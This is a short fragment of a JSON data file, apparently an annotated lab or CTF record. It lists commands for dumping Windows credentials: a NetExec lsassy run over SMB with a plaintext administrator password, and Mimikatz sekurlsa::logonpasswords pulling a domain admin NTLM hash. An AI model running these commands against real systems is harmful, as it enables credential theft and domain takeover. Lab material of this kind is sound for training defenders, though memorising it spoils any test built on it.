        {"source":"C1","description":"nxc lsassy module for remote credential dump","commands":["nxc smb 10.10.x.154 -u administrator -p 'hghgib6vHT3bVWf' -M lsassy"]},
        {"source":"C4","description":"Mimikatz sekurlsa::logonpasswords on MS02 extracts DA NTLM hash","commands":["mimikatz.exe","privilege::debug","sekurlsa::logonpasswords"]}
